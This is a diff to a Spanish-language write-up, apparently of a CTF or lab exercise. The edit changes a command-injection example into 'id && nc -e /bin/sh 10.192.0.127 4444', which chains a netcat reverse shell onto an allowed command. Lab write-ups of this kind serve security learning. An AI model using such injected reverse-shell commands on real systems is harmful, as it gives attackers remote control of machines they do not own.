@@ -58,7 +58,7 @@ También está restringido. Pues nada, a ver si se pueden ejecutar dos comandos:
 ![placeholder]({{ site.url }}/assets/img/0033_201080607_0005.png)
 
 Ahora sí, concatenamos id con un nc y tenemos nuestra shell:
-* _id && nc 10.192.0.127 4444_
+* _id && nc -e /bin/sh 10.192.0.127 4444_
 
 ![placeholder]({{ site.url }}/assets/img/0034_201080607_0006.png)
 
